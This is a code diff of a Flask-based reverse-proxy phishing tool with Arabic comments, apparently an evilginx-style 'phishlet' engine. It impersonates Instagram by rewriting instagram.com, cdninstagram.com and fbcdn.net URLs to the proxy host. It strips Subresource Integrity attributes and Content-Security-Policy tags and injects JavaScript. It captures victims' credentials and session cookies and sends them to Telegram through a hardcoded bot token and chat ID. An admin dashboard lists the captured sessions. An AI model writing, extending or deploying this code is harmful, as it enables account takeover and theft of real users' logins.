@@ -1,20 +1,26 @@
-from flask import Flask, request, render_template, make_response, redirect, url_for, after_this_request
-import requests
-import logging
-import json
-from datetime import datetime
 import os
-import urllib3
 import re
+import json
+import logging
+import urllib3
 import yaml
-from urllib.parse import urljoin, urlparse
 from pathlib import Path
+from datetime import datetime
+from urllib.parse import urljoin, urlparse
 
+import requests
+from flask import (
+    Flask, request, render_template, make_response,
+    redirect, url_for, after_this_request
+)
+
+# تعطيل تحذيرات SSL
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# إعدادات التيليجرام (استخدم متغيرات البيئة للأمان)
+# ======================== إعدادات التيليجرام ========================
 TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc')
 TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '1367401179')
+# ====================================================================
 
 app = Flask(__name__, template_folder='templates')
 app.secret_key = os.urandom(32).hex()
@@ -24,8 +30,8 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
 captured_sessions = {}
 captured_creds = {}
 
+# ======================== تحميل قوالب YAML ========================
 class PhishletLoader:
-    """تحميل وتخزين قوالب الصيد من ملفات YAML"""
     def __init__(self, phishlets_dir='phishlets'):
         self.phishlets_dir = Path(phishlets_dir)
         self.phishlets = {}
@@ -53,7 +59,6 @@ class PhishletLoader:
         return self.phishlets.get(name)
 
     def detect_phishlet(self, host):
-        """اكتشاف القالب المناسب بناءً على اسم النطاق"""
         for name, data in self.phishlets.items():
             target = data.get('target_domain', '')
             if target and (target in host or name.lower() in host.lower()):
@@ -66,6 +71,7 @@ class PhishletLoader:
 
 loader = PhishletLoader()
 
+# ======================== محرك المعالجة ========================
 class PhishletEngine:
     def __init__(self, phishlet_config):
         self.config = phishlet_config
@@ -80,7 +86,6 @@ class PhishletEngine:
         self.force_post = phishlet_config.get('force_post', False)
 
     def send_to_telegram(self, message):
-        """إرسال رسالة إلى تيليجرام مع تقسيمها إذا طالت (أكثر من 4000 حرف)"""
         try:
             max_len = 4000
             for i in range(0, len(message), max_len):
@@ -127,7 +132,6 @@ class PhishletEngine:
         return found
 
     def capture_full_session(self, cookies_jar, current_host, creds_data=None):
-        # استخدام requests.utils.dict_from_cookiejar لتحويل الكوكيز بسهولة
         cookies_dict = requests.utils.dict_from_cookiejar(cookies_jar) if hasattr(cookies_jar, 'get_dict') else {}
         if not cookies_dict:
             for cookie in cookies_jar:
@@ -145,7 +149,6 @@ class PhishletEngine:
                 'user_agent': request.headers.get('User-Agent')
             }
 
-            # إرسال عينة من الكوكيز (أول 10) لتجنب طول الرسالة
             sample_items = list(cookies_dict.items())[:10]
             cookie_sample = "\n".join([f"<code>{k}</code>: <code>{v[:50]}...</code>" for k, v in sample_items])
             if len(cookies_dict) > 10:
@@ -165,8 +168,9 @@ class PhishletEngine:
             return session_id
         return None
 
+    # ======================== دالة إعادة الكتابة المحسّنة ========================
     def rewrite_content(self, content, content_type, current_host):
-        """إعادة كتابة المحتوى باستخدام تقنيات متعددة (من BeastEngineV3 والمشروع الرئيسي)"""
+        """إعادة كتابة المحتوى باستبدال جميع نطاقات إنستجرام وموارده"""
         if not content_type or not any(t in content_type.lower() for t in ['text/html', 'application/javascript', 'text/css', 'application/json']):
             return content
 
@@ -174,45 +178,27 @@ class PhishletEngine:
             if isinstance(content, bytes):
                 content = content.decode('utf-8', errors='ignore')
 
-            # 1. تطبيق sub_filters إذا وجدت
-            if self.sub_filters:
-                for filt in self.sub_filters:
-                    mimes = filt.get('mimes', [])
-                    if any(m in content_type.lower() for m in mimes):
-                        search = filt.get('search', '')
-                        replace = filt.get('replace', '').replace('{hostname}', current_host)
-                        if search:
-                            content = re.sub(search, replace, content, flags=re.IGNORECASE)
-            else:
-                # 2. استبدال افتراضي شامل (مثل BeastEngineV3)
-                for proxy in self.proxy_hosts:
-                    orig_sub = proxy.get('orig_sub', '')
-                    if orig_sub:
-                        orig_domain = f"{orig_sub}.{self.target_domain}"
-                    else:
-                        orig_domain = self.target_domain
-                    # استبدال https://domain، http://domain، //domain، domain
-                    content = content.replace(f"https://{orig_domain}", f"https://{current_host}")
-                    content = content.replace(f"http://{orig_domain}", f"https://{current_host}")
-                    content = content.replace(f"//{orig_domain}", f"//{current_host}")
-                    content = content.replace(orig_domain, current_host)
+            # قائمة بجميع النطاقات التي قد تظهر في المحتوى (يمكن توسيعها)
+            all_domains = ['instagram.com', 'cdninstagram.com', 'fbcdn.net']
 
-            # 3. إزالة integrity لمنع SRI
+            # استبدال شامل لكل النطاقات
+            for domain in all_domains:
+                # https://any.sub.domain
+                content = re.sub(rf'https?://(?:[a-zA-Z0-9-]+\.)*{re.escape(domain)}', f'https://{current_host}', content)
+                # //any.sub.domain
+                content = re.sub(rf'//(?:[a-zA-Z0-9-]+\.)*{re.escape(domain)}', f'//{current_host}', content)
+                # داخل علامات الاقتباس (لـ JSON/JS)
+                content = re.sub(rf'(["''])(?:[a-zA-Z0-9-]+\.)*{re.escape(domain)}(["''])', rf'\1{current_host}\2', content)
+
+            # إزالة integrity لمنع SRI
             content = re.sub(r'integrity="[^"]+"', '', content)
 
-            # 4. إزالة CSP من meta tags
+            # إزالة CSP من meta tags
             content = re.sub(r'<meta[^>]*http-equiv=["\']Content-Security-Policy["\'][^>]*>', '', content)
 
-            # 5. إخفاء رأس CSP داخل النص
-            content = content.replace('Content-Security-Policy', 'X-Ignored-CSP')
-
-            # 6. حقن JavaScript إذا وجد
+            # حقن JavaScript إذا وجد في ملف YAML
             if self.js_inject and '<head>' in content:
                 injection = f"<script>{self.js_inject}</script>"
-                content = content.replace('<head>', f'<head>{injection}')
-            elif '<head>' in content:
-                # حقن كود بسيط لمنع اكتشاف البروكسي (مستوحى من BeastEngineV3)
-                injection = f"<script>window.location.hostname='{current_host}';</script>"
                 content = content.replace('<head>', f'<head>{injection}')
 
             return content.encode('utf-8')
@@ -220,6 +206,7 @@ class PhishletEngine:
             logging.error(f"Rewrite error: {e}")
             return content
 
+# ======================== إشعار الزيارة ========================
 @app.before_request
 def check_visit():
     if request.path == '/' and 'visited' not in request.cookies:
@@ -232,6 +219,7 @@ def check_visit():
             response.set_cookie('visited', '1', max_age=3600)
             return response
 
+# ======================== المسارات الإدارية ========================
 @app.route('/admin/dashboard')
 def admin_dashboard():
     try:
@@ -266,6 +254,7 @@ def clear_sessions():
     captured_creds.clear()
     return redirect(url_for('admin_dashboard'))
 
+# ======================== الوكيل العكسي الرئيسي ========================
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
 def proxy(path):
@@ -308,16 +297,11 @@ def proxy(path):
         if resp.status_code in [301, 302, 303, 307, 308]:
             location = resp.headers.get('Location', '')
             if location:
-                parsed = urlparse(location)
                 new_location = location
-                for proxy in engine.proxy_hosts:
-                    orig_sub = proxy.get('orig_sub', '')
-                    if orig_sub:
-                        orig_domain = f"{orig_sub}.{engine.target_domain}"
-                    else:
-                        orig_domain = engine.target_domain
-                    if orig_domain in parsed.netloc:
-                        new_location = location.replace(parsed.netloc, host)
+                # استبدال النطاق الأصلي بالنطاق الحالي
+                for domain in ['instagram.com', 'cdninstagram.com', 'fbcdn.net']:
+                    if domain in new_location:
+                        new_location = re.sub(rf'https?://(?:[a-zA-Z0-9-]+\.)*{re.escape(domain)}', f'https://{host}', new_location)
                         break
                 proxy_resp = make_response('', resp.status_code)
                 proxy_resp.headers['Location'] = new_location
